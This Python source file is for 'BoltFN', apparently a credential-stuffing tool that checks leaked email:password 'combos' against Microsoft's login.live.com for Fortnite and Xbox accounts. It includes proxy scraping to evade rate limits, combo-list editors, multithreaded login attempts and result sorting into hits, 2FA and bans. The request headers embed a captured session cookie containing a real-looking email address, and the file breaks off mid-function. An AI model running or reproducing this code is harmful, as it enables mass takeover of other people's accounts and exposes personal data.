# -*- coding: utf-8 -*-
import re
import colorama
import concurrent.futures
from yaml import dump, full_load
from deep_translator import GoogleTranslator
from bs4 import BeautifulSoup
from urllib3 import disable_warnings
import requests
from colorama import init, Fore
from random import choice, shuffle
import cloudscraper
import time
import sys
import time
import os
import urllib.request
from ctypes import windll
from os import mkdir, path, system
from queue import Queue
from random import choice
from re import compile as compilee
from threading import Thread
from time import sleep, strftime, gmtime
import urllib3
import urllib
from discord_webhook import DiscordWebhook
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)



init()
default_values = '''checker:
  print_fail: true
  retries: 1
  timeout: 10000
  threads: 100
  save_bad: false
  debugging: false
  webhook:
    Webhook: false
    WebhookID: https://discordapp.com/api/webhooks/
  proxy:
    proxy: true
    proxy_type: HTTP
    proxy_api: false
    api_link: 
'''

while True:
    try:
        config = full_load(open('config/config.yml', 'r', errors='ignore'))
        break
    except FileNotFoundError:
        print(f'{Fore.CYAN}[Config] Creating Config{Fore.RESET}')
        if not path.exists('config'):
            mkdir('config')
        if not path.exists('combos'):
            mkdir('combos')
        if not path.exists('proxies'):
            mkdir('proxies')
        open('config/config.yml', 'w').write(default_values)
        print(f'{Fore.CYAN}[Config] {Fore.GREEN}Created')
        sleep(1.5)
        system('cls')


class banchecker:
    unbanned = 0
    nfa = 0
    sfa = 0
    tempbanned = 0
    banned = 0
    checked = 0
    bad = 0


class counter:
    mailaccessss = 0
    bad = 0
    cpm = 0
    untilsleep = 0
    goodlines = 0
    badlines = 0


class Counter:
    skins_data = []
    xb = 0
    custom = 0
    epic2fa = 0
    fnban = 0
    locked = 0
    mshit = 0
    badd = 0
    hits = 0
    bad = 0
    cpm = 0
    retries = 0
    invalid = 0
    total = 0
    hitspercent = 0
    custompercent = 0
    mshitspercent = 0
    failedpercent = 0
    checkedpercent = 0
    guess = 0


class Main:
    def __init__(self):
        from time import time
        self.bar = ''
        self.unix = str(strftime('-[%d-%m-%Y %H-%M-%S]'))
        self.email = r'[\w.-]+@[\w.-]+'
        self.extracted = '\nSaved extracted'
        self.created = str(strftime('-[%m-%d-%Y %H-%M-%S]'))
        self.domain_list = self.lisr()
        disable_warnings()
        self.version = '1.0'
        self.printing = Queue()
        self.caputer = Queue()
        self.start_time = 0
        self.hits = Queue()
        self.bad = Queue()
        self.debug = Checker.debug
        self.baddd = []
        self.savebad = Checker.save_bad
        self.proxyapi = Checker.Proxy.proxy_api
        self.api_link = Checker.Proxy.proxy_api_link
        self.Paused = False
        self.proxy_type = Checker.Proxy.type
        windll.kernel32.SetConsoleTitleW(
            f'BoltFN | Main menu')
        from colorama import Fore
        self.t = f'''{Fore.LIGHTWHITE_EX}  

                {Fore.GREEN}██████{Fore.CYAN}╗{Fore.GREEN}  ██████{Fore.CYAN}╗{Fore.GREEN} ██{Fore.CYAN}╗{Fore.GREEN}  ████████{Fore.CYAN}╗{Fore.GREEN} ██████{Fore.CYAN}╗{Fore.GREEN}██{Fore.CYAN}╗{Fore.GREEN}  ██{Fore.CYAN}╗{Fore.GREEN}███████{Fore.CYAN}╗{Fore.GREEN} ██████{Fore.CYAN}╗{Fore.GREEN}██{Fore.CYAN}╗{Fore.GREEN}  ██{Fore.CYAN}╗{Fore.GREEN}███████{Fore.CYAN}╗{Fore.GREEN}██████{Fore.CYAN}╗ 
                {Fore.GREEN}██{Fore.CYAN}╔══{Fore.GREEN}██{Fore.CYAN}╗{Fore.GREEN}██{Fore.CYAN}╔═══{Fore.GREEN}██{Fore.CYAN}╗{Fore.GREEN}██{Fore.CYAN}║  ╚══{Fore.GREEN}██{Fore.CYAN}╔══╝{Fore.GREEN}██{Fore.CYAN}╔════╝{Fore.GREEN}██{Fore.CYAN}║{Fore.GREEN}  ██{Fore.CYAN}║{Fore.GREEN}██{Fore.CYAN}╔════╝{Fore.GREEN}██{Fore.CYAN}╔════╝{Fore.GREEN}██{Fore.CYAN}║{Fore.GREEN} ██{Fore.CYAN}╔╝{Fore.GREEN}██{Fore.CYAN}╔════╝{Fore.GREEN}██{Fore.CYAN}╔══{Fore.GREEN}██{Fore.CYAN}╗
                {Fore.GREEN}██████{Fore.CYAN}╔╝{Fore.GREEN}██{Fore.CYAN}║{Fore.GREEN}   ██{Fore.CYAN}║{Fore.GREEN}██{Fore.CYAN}║{Fore.GREEN}     ██{Fore.CYAN}║{Fore.GREEN}   ██{Fore.CYAN}║{Fore.GREEN}     ███████{Fore.CYAN}║{Fore.GREEN}█████{Fore.CYAN}╗{Fore.GREEN}  ██{Fore.CYAN}║{Fore.GREEN}     █████{Fore.CYAN}╔╝{Fore.GREEN} █████{Fore.CYAN}╗{Fore.GREEN}  ██████{Fore.CYAN}╔╝
                {Fore.CYAN}██{Fore.GREEN}╔══{Fore.CYAN}██{Fore.GREEN}╗{Fore.CYAN}██{Fore.GREEN}║{Fore.CYAN}   ██{Fore.GREEN}║{Fore.CYAN}██{Fore.GREEN}║{Fore.CYAN}     ██{Fore.GREEN}║{Fore.CYAN}   ██{Fore.GREEN}║{Fore.CYAN}     ██{Fore.GREEN}╔══{Fore.CYAN}██{Fore.GREEN}║{Fore.CYAN}██{Fore.GREEN}╔══╝{Fore.CYAN}  ██{Fore.GREEN}║{Fore.CYAN}     ██{Fore.GREEN}╔═{Fore.CYAN}██{Fore.GREEN}╗{Fore.CYAN} ██{Fore.GREEN}╔══╝{Fore.CYAN}  ██{Fore.GREEN}╔══{Fore.CYAN}██{Fore.GREEN}╗
                {Fore.CYAN}██████{Fore.GREEN}╔╝╚{Fore.CYAN}██████{Fore.GREEN}╔╝{Fore.CYAN}███████{Fore.GREEN}╗{Fore.CYAN}██{Fore.GREEN}║   ╚{Fore.CYAN}██████{Fore.GREEN}╗{Fore.CYAN}██{Fore.GREEN}║{Fore.CYAN}  ██{Fore.GREEN}║{Fore.CYAN}███████{Fore.GREEN}╗╚{Fore.CYAN}██████{Fore.GREEN}╗{Fore.CYAN}██{Fore.GREEN}║{Fore.CYAN}  ██{Fore.GREEN}╗{Fore.CYAN}███████{Fore.GREEN}╗{Fore.CYAN}██{Fore.GREEN}║{Fore.CYAN}  ██{Fore.GREEN}║
                {Fore.GREEN}╚═════╝  ╚═════╝ ╚══════╝╚═╝    ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
'''


        
        def versionchecker():
            import os
            import re
            import shutil
            import sqlite3
            from sys import exit
            from json import loads
            from random import randint
            from shutil import copyfile
            from base64 import b64decode

        versionchecker()
        def print_slowly(text, speed):
            for c in text:
                print(c, end='')
                sys.stdout.flush()
                sleep(speed)
            sleep(0.1)
        print(Fore.CYAN)
        print_slowly('Checking for updates .....', 0.03)
        while True:
            try:
                r = requests.get('https://raw.githubusercontent.com/Shaggymop/BoltFN/main/version.txt')
                ver = r.text.strip()
                break
            except:
                print(f'{Fore.RED}Error getting version')
                sleep(1)
                continue
        if str(ver) == str(self.version):
            print(Fore.GREEN)
            print_slowly('You are using the latest version!', 0.05)
        else:
            print(Fore.YELLOW)
            print_slowly('You are using an outdated version!', 0.05)
            os.system('exit')
        from time import time
        system('cls')
        windll.kernel32.SetConsoleTitleW(
                f'BoltFN | v{self.version} | Select A mode')
        print(self.t)
        print(f'''
{Fore.GREEN}|{Fore.WHITE}OPTIONS:

{Fore.WHITE}[{Fore.GREEN}1{Fore.WHITE}] Check Accounts {Fore.CYAN}| Normal Mode
{Fore.WHITE}[{Fore.GREEN}2{Fore.WHITE}] Scrape Proxies {Fore.CYAN}| Scrape proxies for checking
{Fore.WHITE}[{Fore.GREEN}3{Fore.WHITE}] Edit Combos {Fore.CYAN}| Maximise your combos
{Fore.WHITE}[{Fore.GREEN}4{Fore.WHITE}] Custom Url Scraper{Fore.CYAN} | Scrape proxies from a url file
{Fore.WHITE}[{Fore.GREEN}5{Fore.WHITE}] Exit{Fore.CYAN} | Close the checker
''')
        mode = input(f'{Fore.YELLOW} > ')


        if mode == "3":
            system('cls')
            print(self.t)
            windll.kernel32.SetConsoleTitleW(
                f'BoltFN V{self.version} | Module: ComboEditor')
            print(f'''
{Fore.GREEN}|{Fore.WHITE}OPTIONS:

[{Fore.GREEN}1{Fore.WHITE}] Minecraft edits
[{Fore.GREEN}2{Fore.WHITE}] General edits
[{Fore.GREEN}3{Fore.WHITE}] Domain Sorter
[{Fore.GREEN}4{Fore.WHITE}] Domain Randomizer
[{Fore.GREEN}5{Fore.WHITE}] Domain Remover (Email:Pass - User:Pass)
[{Fore.GREEN}6{Fore.WHITE}] File Splitter
[{Fore.GREEN}7{Fore.WHITE}] Text Merger
[{Fore.GREEN}8{Fore.WHITE}] Username Extrator
[{Fore.GREEN}9{Fore.WHITE}] Email Extrator
[{Fore.GREEN}10{Fore.WHITE}] Combo Extractor
[{Fore.GREEN}11{Fore.WHITE}] Duplicate Remover
[{Fore.GREEN}12{Fore.WHITE}] Combo filter (remove bad lines)
[{Fore.GREEN}13{Fore.WHITE}] Domain changer
[{Fore.RED}14{Fore.WHITE}] BACK
''')
            while True:
                option = str(input(f'{Fore.YELLOW} > '))
                if option in ("1", "2", "3", "4", "5", "6", "8", "9", "10", "11", "12", "13"):
                    while True:
                        Result = ('Results')
                        if not path.exists(Result):
                            mkdir(Result)
                        self.result = ("Results/Domain")
                        self.file = input(
                            f'{Fore.CYAN}[ComboEditor] Combo file:')
                        if not path.exists(self.file):
                            print(Fore.RED + "[ERROR] Not a valid file")
                            sleep(0.8)
                            continue
                        else:
                            with open(self.file, 'r+', encoding='latin-1') as self.lines:
                                self.get_option(option)

                elif option == "7":
                    while True:
                        self.result = f'results{self.unix}.txt'
                        self.folder = input(
                            '\nFolder name (Make sure folder is in the same folder as the program) :\n< ')
                        try:
                            with open(f'{self.result}', 'a', encoding='latin-1') as self.infile:
                                self.get()
                        except FileNotFoundError:
                            print("Folder not found.")
                            continue
                elif option == "14":
                    system('cls')
                    Main()
                else:
                    print(
                        f"{Fore.CYAN}\nPlease enter a valid number\n{Fore.YELLOW}")
                    sleep(1)
                    continue
        elif mode == "4":
            system('cls')
            print(self.t)
            if not path.exists('Scraped.txt'):
                file = open("Scraped.txt", "w")
                file.write("")
                file.close()
            if not path.exists('Urls.txt'):
                file = open("Urls.txt", "w")
                file.write("")
                file.close()
            print(
                f'{Fore.CYAN}Press ENTER to start scraping (make sure your urls are in urls.txt)')
            input('')
            urls = []
            proxies = []
            scrapedproxies = []
            tim = int(input('Timeout: '))
            urlss = open('urls.txt', 'r', encoding='u8',
                         errors='ignore').read().split('\n')
            improvedurls = [x for x in urlss if x != '' and 'http' in x]
            for line in improvedurls:
                urls.append(line)
            while True:
                currentnumber = open(
                    'Scraped.txt', 'r', encoding='u8', errors='ignore').read().split('\n')
                beforescrape = (len(scrapedproxies))
                for url in urls:
                    try:
                        r = requests.get(url, timeout=tim)
                    except:
                        print(f'{Fore.RED}[-] Couldn\'t connect {url}')
                        urls.remove(url)
                        continue
                lol = r.text.split('\n')
                urls.remove(url)
                for line in lol:
                    proxies.append(line)
                    scrapedproxies = [
                        x for x in proxies if x != '' and ':' in x and 'a' not in x and 'b' not in x and 'c' not in x and 'd' not in x and 'e' not in x and 'f' not in x and 'g' not in x and 'h' not in x and 't' not in x]
                    scraped = len(scrapedproxies) - beforescrape
                print(f'{Fore.GREEN}[+] Scraped {scraped} Proxies from {url}')
                for proxy in scrapedproxies:
                    open(f'Scraped.txt', 'a', encoding='u8').write(
                        f'{proxy}\n')
                if len(urls) > 0:
                    continue
                else:
                    print('Done scraping')
                    break
            input('Press ENTER to get back to the menu\n')
            system('cls')
            Main()

        elif mode == "2":
            system('cls')
            print(self.t)
            urls = [
                'https://api.proxyscrape.com/?request=getproxies&proxytype=socks4&timeout=10000&country=all']
            urls.append(
                'https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=10000&country=all')
            urls.append(
                'https://api.proxyscrape.com/?request=getproxies&proxytype=socks5&timeout=10000&country=all')
            urls.append(
                'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt')
            urls.append(
                'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt')
            urls.append(
                'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt')
            urls.append(
                'https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt')
            urls.append(
                'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt')
            urls.append(
                'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt')
            urls.append(
                'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt')
            urls.append(
                'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt')
            urls.append('https://multiproxy.org/txt_all/proxy.txt')
            urls.append('http://rootjazz.com/proxies/proxies.txt')
            urls.append('http://ab57.ru/downloads/proxyold.txt')
            downloadfilename2 = input('File to save proxies eg proxies.txt:')
            windll.kernel32.SetConsoleTitleW(
                f'BoltFN | v{self.version} | Scraping Proxies | BoltProxy')
            print(f'{Fore.CYAN}Press ENTER to start scraping')
            input('')
            proxies = []
            scrapedproxies = []
            done = []
            while True:
                for url in urls:
                    try:
                        r = requests.get(url, timeout=20)
                    except Exception as error:
                        print(error)
                        continue
                lol = r.text.split('\n')
                urls.remove(url)
                for line in lol:
                    proxies.append(line)
                scraped = len(proxies)
                print(f'{Fore.GREEN}[+] Scraped {scraped} Proxies')
                for proxy in proxies:
                    if proxy.count(':') == 1:
                        if len(proxy) < 30:
                            done.append(proxy + '\n')
                if len(urls) > 0:
                    continue
                else:
                    print(f'{Fore.CYAN}Done scraping\n')
                    break
            windll.kernel32.SetConsoleTitleW(
                f'BoltFN | v{self.version} | Done Scraping | BoltProxy')
            print(f'Proxies scraped: {len(done)}')
            print(f'Removing duplicates...')
            output_file: str = f'{downloadfilename2}'
            open(output_file, 'w', encoding='latin-1').writelines(
                set(done))
            afterremove = open(output_file, 'r', encoding='u8',
                               errors='ignore').read().split('\n')
            beforeremove = len(done)
            removed = beforeremove - len(afterremove)
            print(f'{Fore.CYAN}Done\n')
            input('Press ENTER to get back to the menu')
            system('cls')
            Main()
        elif mode == "5":
            exit()
        elif mode == "1":
            system('cls')
            print(self.t)
            print("")
        else:
            print("Wrong number!")
            system('cls')
            Main()
        checkname = input(f'{Fore.LIGHTCYAN_EX}Name for the check: ')
        lol = input('Would you like to use CUIMode? y/n: ')
        if 'y' == lol:
            self.cuimode = 'y'
        else:
            self.cuimode = 'n'
        system('cls')
        print(self.t)
        print("")
        print(f'{Fore.LIGHTCYAN_EX}Here is your current config:\n')
        print(f'{Fore.CYAN}-- Proxy: {Checker.Proxy.proxy}')
        if Checker.Proxy.proxy == True:
            print(f'{Fore.CYAN}-- Proxy Type: {Checker.Proxy.type}')
        print(f'{Fore.CYAN}-- Threads: {Checker.threads}')
        print(f'{Fore.CYAN}-- Timeout: {Checker.timeout}')
        print(
            f'{Fore.LIGHTCYAN_EX}Are you happy with this config? (y to start checking n to edit)')
        edit = input('> ')
        if 'n' in edit:
            system('cls')
            print(self.t)
            print(f'{Fore.CYAN}[Config] Ok lets edit your config then\n')
            print(
                f'{Fore.CYAN}[Config] Would you like to use proxies for checking? y/n')
            lol = input('> ')
            if 'y' == lol:
                Checker.Proxy.proxy = True
            else:
                Checker.Proxy.proxy = False
            print(f'{Fore.CYAN}[Config] Proxy set to {Checker.Proxy.proxy}')
            if Checker.Proxy.proxy:
                print(
                    f'{Fore.CYAN}[Config] What type of proxy are you using? socks4|socks5|http')
                self.proxy_type = str(input('> '))
                print(
                    f'{Fore.CYAN}[Config] Proxy Type set to {self.proxy_type}')
            print(
                f'{Fore.CYAN}[Config] How many threads would you like to use? (max 1000)')
            while True:
                try:
                    Checker.threads = int(input('> '))
                    break
                except:
                    print(f'{Fore.CYAN}[Config] Please Enter a number')
                    sleep(0.5)
            print(f'{Fore.CYAN}[Config] Threads set to {Checker.threads}')
            print(
                f'{Fore.CYAN}[Config] What would you like your request timeout to be? (in seconds)')
            Checker.timeout = int(input('> '))
            print(
                f'{Fore.CYAN}[Config] Request timeout set to {Checker.timeout}')
            print(f'{Fore.CYAN}[Config] How many retries would you like?')
            Checker.retries = int(input('> '))
            print(f'{Fore.CYAN}[Config] Retries set to {Checker.retries}')
            config['checker']['proxy']['proxy'] = Checker.Proxy.proxy
            config['checker']['threads'] = Checker.threads
            config['checker']['timeout'] = Checker.timeout * 1000 
            config['checker']['retries'] = Checker.retries
            config['checker']['proxy']['proxy_type'] = self.proxy_type
            with open('config/config.yml', 'w') as file:
                dump(config, file)
            print(f'{Fore.GREEN}[Config] Updated values')
            sleep(1)
            system('cls')
        print(f'{Fore.CYAN}Importing combos.....\n')
        while True:
            read_files = glob('combos/*.txt')
            if read_files == '[]':
                print(
                    f'{Fore.YELLOW}No Combos files found in directory please put your combos in there and try again')
                input(f'{Fore.CYAN}Press ENTER when you have done that')
                continue
            self.combolist = []
            for file in read_files:
                combolistt = open(file, 'r', encoding='u8',
                                  errors='ignore').read().split('\n')
                for line in combolistt:
                    self.combolist.append(f'{line}')
            break
        withoutremoved = len(self.combolist)
        self.accounts = set([x for x in self.combolist if x != '' and ':' in x])
        removed = withoutremoved - len(self.accounts)
        print(
        f'{Fore.GREEN}Imported {len(self.accounts)} Proxy lines after removing {removed} duplicates\n')
        print(f'{Fore.CYAN}Importing proxies.....\n')
        if Checker.Proxy.proxy == True:
            while True:
                read_files = glob('proxies/*.txt')
                if read_files == '[]':
                    print(
                        f'{Fore.YELLOW}No Proxies files found in directory please put your proxies in there and try again')
                    input(f'{Fore.CYAN}Press ENTER when you have done that')
                    continue
                self.proxylist = []
                for file in read_files:
                    proxylistt = open(file, 'r', encoding='u8',
                                      errors='ignore').read().split('\n')
                    for line in proxylistt:
                        self.proxylist.append(f'{line}')
                break
        if Checker.Proxy.proxy == True:
            if not self.proxyapi:
                withoutremoved = len(self.proxylist)
                self.proxylist = list(
                    set([x.strip() for x in self.proxylist if ":" in x and x != '']))
                removed = withoutremoved - len(self.proxylist)
                print(
                    f'{Fore.GREEN}Imported {len(self.proxylist)} Proxy lines after removing {removed} duplicates')
            else:
                print(f'{Fore.CYAN}Importing proxies from api...\n')
                self.proxylist = requests.get(
                    Checker.Proxy.proxy_api_link).text.split('\n')
                print(f'{Fore.GREEN}Imported {len(self.proxylist)} Proxy lines\n')
        print(f'{Fore.LIGHTCYAN_EX}[BoltFN] Starting Threads...\n')
        windll.kernel32.SetConsoleTitleW(
            f'BoltFN | v{self.version} | Getting ready!')
        unix = str(strftime('%d-%m-%Y %H-%M-%S'))
        if not path.exists('Results'):
            mkdir('Results')
        self.folder = f'Results/Normal Mode-({checkname}){unix}'
        if not path.exists(self.folder):
            mkdir(self.folder)
        Thread(target=self.cpm_counter, daemon=False).start()
        self.start_time = time()
        Thread(target=self.title, daemon=False).start()
        print(f'{Fore.GREEN}[BoltFN] Done!\n')
        sleep(3)
        system('cls')
        print(self.t)
        if 'y' == self.cuimode:
            print(f'{Fore.LIGHTCYAN_EX}Checking: CUI Mode')
        else:
            print(f'{Fore.LIGHTCYAN_EX}Checking: LOG Mode')
        print(f'{Fore.CYAN}-- Proxy: {Checker.Proxy.proxy}')
        if Checker.Proxy.proxy:
            print(f'{Fore.CYAN}-- Proxy Type: {Checker.Proxy.type}')
        print(f'{Fore.CYAN}-- Threads: {Checker.threads}')
        print(f'{Fore.CYAN}-- Timeout: {Checker.timeout}')
        print(f'{Fore.CYAN}-- Retries: {Checker.retries}\n')
        try:
            print(f'{Fore.CYAN}- Combo Lines: {len(self.combolist)}')
            print(f'{Fore.CYAN}- Proxy Lines: {len(self.proxylist)}\n')
        except:
            self.proxylist = []
        if 'y' == self.cuimode:
            Thread(target=self.Refreshconsole, daemon=False).start()
        with concurrent.futures.ThreadPoolExecutor(max_workers=Checker.threads) as executor:
            futures = [executor.submit(self.usecheck, combo) for combo in self.accounts]
            concurrent.futures.wait(futures)
                    
                            
    def usecheck(self, line):
        try:
            if line.count(':') == 1:
                checked_num = 0
                email, password = line.split(':')
                while True:
                    if checked_num != Checker.retries:
                            session = requests.sessions.session()
                            scraper = cloudscraper.create_scraper()
                            url = 'https://login.live.com/ppsecure/post.srf?client_id=82023151-c27d-4fb5-8551-10c10724a55e&contextid=A31E247040285505&opid=F7304AA192830107&bk=1701944501&uaid=a7afddfca5ea44a8a2ee1bba76040b3c&pid=15216'
                            headers = {
                                    "Accept-Encoding": "gzip, deflate, br",
                                    "Accept-Language": "en,en-US;q=0.9,en;q=0.8",
                                    "Cache-Control": "max-age=0",
                                    "Connection": "keep-alive",
                                    "Content-Length": "814",  # Make sure the content length is correct; it's generally calculated automatically.
                                    "Content-Type": "application/x-www-form-urlencoded",
                                    "Cookie": "MicrosoftApplicationsTelemetryDeviceId=920e613f-effa-4c29-8f33-9b639c3b321b; MSFPC=GUID=1760ade1dcf744b88cec3dccf0c07f0d&HASH=1760&LV=202311&V=4&LU=1701108908489; mkt=ar-SA; IgnoreCAW=1; MUID=251A1E31369E6D281AED0DE737986C36; MSCC=197.33.70.230-EG; MSPBack=0; NAP=V=1.9&E=1cca&C=sD-vxVi5jYeyeMkwVA7dKII2IAq8pRAa4DmVKHoqD1M-tyafuCSd4w&W=2; ANON=A=D086BC080C843D7172138ECBFFFFFFFF&E=1d24&W=2; SDIDC=CVbyEkUg8GuRPdWN!EPGwsoa25DdTij5DNeTOr4FqnHvLfbt1MrJg5xnnJzsh!HecLu5ZypjM!sZ5TtKN5sdEd2rZ9rugezwzlcUIDU5Szgq7yMLIVdfna8dg3sFCj!kQaXy2pwx6TFwJ7ar63EdVIz*Z3I3yVzEpbDMlVRweAFmG1M54fOyH0tdFaXs5Mk*7WyS05cUa*oiyMjqGmeFcnE7wutZ2INRl6ESPNMi8l98WUFK3*IKKZgUCfuaNm8lWfbBzoWBy9F3hgwe9*QM1yi41O*rE0U0!V4SpmrIPRSGT5yKcYSEDu7TJOO1XXctcPAq21yk*MnNVrYYfibqZvnzRMvTwoNBPBKzrM6*EKQd6RKQyJrKVdEAnErMFjh*JKgS35YauzHTacSRH6ocroAYtB0eXehx5rdp2UyG5kTnd8UqA00JYvp4r1lKkX4Tv9yUb3tZ5vR7JTQLhoQpSblC4zSaT9R5AgxKW3coeXxqkz0Lbpz!7l9qEjO*SdOm*5LBfF2NZSLeXlhol**kM3DFdLVyFogVq0gl0wR52Y02; MSPPre=imrozza%40outlook.com%7c8297dd0d702a14b0%7c%7c; MSPCID=8297dd0d702a14b0; MSPSoftVis=@:@; MSPRequ=id=N&lt=1701944501&co=0; uaid=a7afddfca5ea44a8a2ee1bba76040b3c; OParams=11O.DmVQflQtPeQAtoyExD*hjGXsJOLcnQHVlRoIaEDQfzrgMX2Lpzfa992qCQeIn0O8kdrgRfMm1kEmcXgJqSTERtHj0vlp9lkdMHHCEwZiLEOtxzmks55h!6RupAnHQKeVfVEKbzcTLMei4RMeW1drXQ0BepPQN*WgCK3ua!f6htixcJYNtwumc8f29KYtizlqh0lqQ3a2dZ4Kd!KDOneLTE512ScqObfQd5AGBu*xLbcRbg6xqh1eWCOXW!JOT6defiMqxBGPNL1kQUYgc5WAG8tmjMPFLqVn1*f4xws1NDhwmYOHPu!rS9dn*trC71knxMAfi5Tt69XZHdojgnuopBag*YM7uIBrhUyfxjR*4Zkyygfax9gMaxxG9KScOnPvemNY1ZfVH9Vm!IxQFKoPoKBdLVH5Jc7Eokycow31oq7vNcAbi!cS3Wby0LjzBdr8jq2Aqj3RlWfckJaRoReZ4nY34Gh*eVllAMrF*VQP1iQ7t*I28266q6OQGZ9Y1q53Ai72b!8H5wjQJIJw1XV4zwRO8J02gt6vIPpLBFiq!7IkawEubBPpynkQ3neDo92Tpc71Y*WrnD6H8ojgzxRAj!DIiyfyA7kJHJ7DU!XSg*Xo0L1!DRYSBV!PKwNM7MaBiqsKbRWFnFyzKhBACfiPe8dK5ZUGBSpFbUlpXkUJOb247ewTWAsl9D4G6mezVjGY1u9uOYUPc3ZqTEBFRf4TK94CllbiMRC0v26W*qlwOl0SSpBufo8MtOUqvowUFqEWDDVl9WFV5bT2zZVUy4kPj9a*3YNnskgZghnOCtQYKIIRdFTWgL*DcbQ4XRL8hMisBDjyniS16W2P!1FH0dT12w7RlsJCdotQSK1WppX8sGWNrPrYNcih5ErXVZtYKbqrZLw2EcyGmkp7NxBHFUQXx*1tZSEeiWoZ5BrHSiEB7X2gB7BQDP7RbVYZS5UXeNp3rlGdN*5!nUGK3Fltm1sKFmtZU!T1Q0WaeFwVvpFYSCxg9uw6CC!va2dB*R6NFK!3GNBDrCvbXnJMaKVb!UoBP5G*GASdPnuJgb3cjUE*DIYMJRrPT!dZoHd5BAQSF3vBoPZasphWeflxXFMPBi055OBEawIzxOqS6Wn3IZCp3dgk8QLNssATkzwZvpUM5lSq710QTMZWENDKp5gTIlWcdYpKG1d8TmRlqXRJN7bdUuRIoehIWqnfSuJxGoNk6PM3x3!gMaxPxe1Ch6hMmsagHM8fFQ!MpP0TQ9nsIxh1goCaL*PbHDyj1U3btyu2RXibwIwgV1h5A6DgwmgbaH1Hn9LpdLipiT5fGiRbI903!wYUA3MgQg98OH9BQaJPXte1YpL8iUjUA9MreaZTQ5P13cUiNYrkTW2jVr5PTpEJvwpg*8piWEo9k*IzOCr6iKMRiZwTft*QYEEaKxbyvgLG*s33uhCN46R9J1VwPufzsxyGUHYyE5S1mhx8sWxw!pndIQ!RgVEsDfzvOO0H2P1hBGQG8npJ18th2WKYrvouqHZfRBcEc77hsbXUKec2lv4ETHag0RdrT6kFn03RDX*p*Hac*nugVJK1j0GouxkITbOmMjb8cpau*Lf*xNBUFc3roCuPjEpAcR48X51rIGpOjhAe56Q6CbwIuVe*z*KmRptzngkT4!AB*FGGKh2lOi6b0qR1w4Aia2g1pfjJU2G1r*Q!kSNxYtGn0WOkHiVkhAXQCvkNFp3q!ivZs3obM!0ffg$$; ai_session=6FvJma4ss/5jbM3ZARR4JM|1701943445431|1701944504493; MSPOK=$uuid-d9559e5d-eb3c-4862-aefb-702fdaaf8c62$uuid-d48f3872-ff6f-457e-acde-969d16a38c95$uuid-c227e203-c0b0-411f-9e65-01165bcbc281$uuid-98f882b7-0037-4de4-8f58-c8db795010f1$uuid-0454a175-8868-4a70-9822-8e509836a4ef$uuid-ce4db8a3-c655-4677-a457-c0b7ff81a02f$uuid-160e65e0-7703-4950-9154-67fd0829b36",
                                    "Host": "login.live.com",
                                    "Origin": "https://login.live.com",
                                    "Referer": "https://login.live.com/oauth20_authorize.srf?client_id=82023151-c27d-4fb5-8551-10c10724a55e&redirect_uri=https%3A%2F%2Faccounts.epicgames.com%2FOAuthAuthorized&state=eyJpZCI6IjAzZDZhYmM1NDIzMjQ2Yjg5MWNhYmM2ODg0ZGNmMGMzIn0%3D&scope=xboxlive.signin&service_entity=undefined&force_verify=true&response_type=code&display=popup",
                                    "Sec-Fetch-Dest": "document",
                                    "Sec-Fetch-Mode": "navigate",
                                    "Sec-Fetch-Site": "same-origin",
                                    "Sec-Fetch-User": "?1",
                                    "Upgrade-Insecure-Requests": "1",
                                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
                                    "sec-ch-ua": "\"Not_A Brand\";v=\"99\", \"Google Chrome\";v=\"109\", \"Chromium\";v=\"109\"",
                                    "sec-ch-ua-mobile": "?0",
                                    "sec-ch-ua-platform": "\"Windows\""
                            }
                            payload = {
                                "i13": "0",
                                "login": email,
                                "loginfmt": email,
                                "type": "11",
                                "LoginOptions": "3",
                                "lrt": "",
                                "lrtPartition": "",
                                "hisRegion": "",
                                "hisScaleUnit": "",
                                "passwd": password,
                                "ps": "2",
                                "psRNGCDefaultType": "1",
                                "psRNGCEntropy": "",
                                "psRNGCSLK": "-DiygW3nqox0vvJ7dW44rE5gtFMCs15qempbazLM7SFt8rqzFPYiz07lngjQhCSJAvR432cnbv6uaSwnrXQ*RzFyhsGXlLUErzLrdZpblzzJQawycvgHoIN2D6CUMD9qwoIgR*vIcvH3ARmKp1m44JQ6VmC6jLndxQadyaLe8Tb!ZLz59Te6lw6PshEEM54ry8FL2VM6aH5HPUv94uacHz!qunRagNYaNJax7vItu5KjQ",
                                "canary": "",
                                "ctx": "",
                                "hpgrequestid": "",
                                "PPFT": "-DjzN1eKq4VUaibJxOt7gxnW7oAY0R7jEm4DZ2KO3NyQh!VlvUxESE5N3*8O*fHxztUSA7UxqAc*jZ*hb9kvQ2F!iENLKBr0YC3T7a5RxFF7xUXJ7SyhDPND0W3rT1l7jl3pbUIO5v1LpacgUeHVyIRaVxaGUg*bQJSGeVs10gpBZx3SPwGatPXcPCofS!R7P0Q$$",
                                "PPSX": "Passp",
                                "NewUser": "1",
                                "FoundMSAs": "",
                                "fspost": "0",
                                "i21": "0",
                                "CookieDisclosure": "0",
                                "IsFidoSupported": "1",
                                "isSignupPost": "0",
                                "isRecoveryAttemptPost": "0",
                                "i19": "21648"
                            }
                            while True:
                                try:
                                    response = session.post(url, headers=headers, data=payload, proxies=self.proxies(), timeout=Checker.timeout)
                                    break
                                except Exception as e:
                                    Counter.retries+=1
                                    continue
                            result = self.check_response(response)
                            if result == 'Failure' or result == '2FACTOR' or result == 'Ban' or result == 'CUSTOM' or result == 'Unknown':
                                checked_num+=1
                                Counter.retries+=1    
                                continue
                            else:
                                url = self.parse_source_for_url(response.text)
                                if url:
                                    try:
                                        rr = self.parse_url(url)  
                                        o_params = self.parse_cookie(session.cookies, "OParams")
                                        msa = self.parse_cookie(session.cookies, "__Host-MSAAUTH")
